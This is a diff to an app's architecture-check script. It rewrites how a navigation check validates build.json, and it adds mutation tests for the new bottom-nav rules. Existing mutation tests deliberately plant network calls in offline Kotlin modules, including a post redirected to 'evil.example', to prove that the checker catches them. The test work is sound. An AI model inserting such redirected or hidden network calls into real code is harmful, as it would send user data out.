@@ -5,7 +5,7 @@
 # ╚══════════════════════════════════════════════════════════════════════════╝
 #
 #   C1  every declared tab has a mode, every mode names a declared tab, ids unique; #770 every
-#       section (ui.sections) has a tab and every tab names a declared section.
+#       section (ui.sections) has a page (tab); #868 ui.bottom_nav is the island's section ids.
 #   C2  the kinds build.json declares and the kinds ModeScreen's `when (mode.kind)`
 #       dispatches are the same set, both ways: a declared kind with no renderer
 #       draws the "no renderer" line, a renderer no mode uses is dead code.
@@ -82,19 +82,29 @@ kts = sorted(glob.glob(os.path.join(src, "**", "*.kt"), recursive=True))
 jsrc = os.path.join(app, "jev", "src", "main", "kotlin", "com", "diegonmarcos", "cloudcalc", "jev")
 jkts = sorted(glob.glob(os.path.join(jsrc, "**", "*.kt"), recursive=True))
 bj = json.load(open(os.path.join(app, "build.json"), encoding="utf-8"))
-tabs, modes = bj["ui"]["tabs"], bj["ui"]["modes"]
+modes = bj["ui"]["modes"]
 
-# C1
+# C1  #868 the nav is ONE declaration: ui.bottom_nav (<= 5 section ids) + ui.sections[].pages (the
+# old tabs) + ui.default_section. A page is a tab; it names its section by sitting in its pages.
 sections = bj["ui"].get("sections", [])
+tabs = [dict(p, section=s["id"]) for s in sections for p in s.get("pages", [])]
 sec_ids = [x["id"] for x in sections]
 if not sec_ids:
     bad.append("C1 build.json::ui.sections is empty — no tab could be shown")
+bar = bj["ui"].get("bottom_nav", [])
+if not bar or len(bar) > 5:
+    bad.append("C1 ui.bottom_nav must hold one to five section ids, found %s" % bar)
+for b in bar:
+    if b not in sec_ids:
+        bad.append("C1 ui.bottom_nav names %s, which is not a ui.sections id" % b)
+if bj["ui"].get("default_section") not in bar:
+    bad.append("C1 ui.default_section %r is not one of ui.bottom_nav" % bj["ui"].get("default_section"))
+for k in ("tabs", "default_tab"):
+    if k in bj["ui"]:
+        bad.append("C1 ui.%s is back: the nav is ui.bottom_nav + ui.sections[].pages (#868)" % k)
 for x in sec_ids:
     if not any(t.get("section") == x for t in tabs):
-        bad.append("C1 section %s has no tab — its bottom nav would be empty" % x)
-for t in tabs:
-    if t.get("section") not in sec_ids:
-        bad.append("C1 tab %s names section %s, which is not declared — it can never be reached" % (t["id"], t.get("section")))
+        bad.append("C1 section %s has no page — its top strip would be empty" % x)
 tab_ids = [t["id"] for t in tabs]
 for t in tab_ids:
     if not any(m["tab"] == t for m in modes):
@@ -373,8 +383,9 @@ JV='jev/src/main/kotlin/com/diegonmarcos/cloudcalc/jev'
 mutate router-online "$JV/JevRouter.kt" 's + "\nprivate fun leak() = java.net.Socket(\"x\", 1)\n"' "C6 JevRouter.kt uses the network"
 mutate url-in-decisions "$JV/Decisions.kt" 's.replace("post(cfg.endpoint, cfg.timeoutMs,", "post(\"https://evil.example\", cfg.timeoutMs,")' "C6 jev/Decisions.kt spells a URL"
 mutate decisions-online "$JV/Decisions.kt" 's + "\nprivate fun leak() = java.net.URL(\"x\").openConnection()\n"' "C6 Decisions.kt uses the network"
-mutate section-without-tab build.json 's.replace("\"section\": \"measure\"", "\"section\": \"calculator\"")' "C1 section measure has no tab"
-mutate tab-orphan-section build.json 's.replace("\"section\": \"jev\"", "\"section\": \"nowhere\"", 1)' "names section nowhere"
+mutate bottom-nav-orphan build.json 's.replace("\"bottom_nav\": [\"calculator\", \"measure\", \"jev\"]", "\"bottom_nav\": [\"calculator\", \"measure\", \"nowhere\"]")' "C1 ui.bottom_nav names nowhere"
+mutate bottom-nav-six build.json 's.replace("\"bottom_nav\": [\"calculator\", \"measure\", \"jev\"]", "\"bottom_nav\": [\"calculator\", \"measure\", \"jev\", \"a\", \"b\", \"c\"]")' "C1 ui.bottom_nav must hold one to five"
+mutate default-off-bar build.json 's.replace("\"default_section\": \"calculator\"", "\"default_section\": \"history\"")' "C1 ui.default_section"
 mutate section-icon build.json 's.replace("\"icon\": \"psychology\"", "\"icon\": \"psycho\"")' "C3 tab jev icon"
 mutate jev-tool-no-mode build.json 's.replace("\"mode\": \"units\"", "\"mode\": \"unitz\"")' "C11 jev tool units names mode unitz"
 mutate jev-tool-no-form build.json 's.replace("\"form\": \"dbsum\"", "\"form\": \"dbsun\"")' "names form dbsun"
